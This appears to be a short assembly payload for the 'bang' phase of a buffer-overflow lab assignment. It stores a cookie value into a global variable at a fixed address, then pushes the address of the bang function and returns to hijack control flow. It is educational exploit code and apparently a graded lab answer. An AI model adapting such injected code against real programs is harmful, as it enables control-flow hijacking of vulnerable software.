# Assembly code for bang portion of lab3
movabs $0x6b8a2168782977de, %rdx # Move cookie to global_value
movq %rdx, 0x602308
pushq $0x401020 # Push address of bang
retq
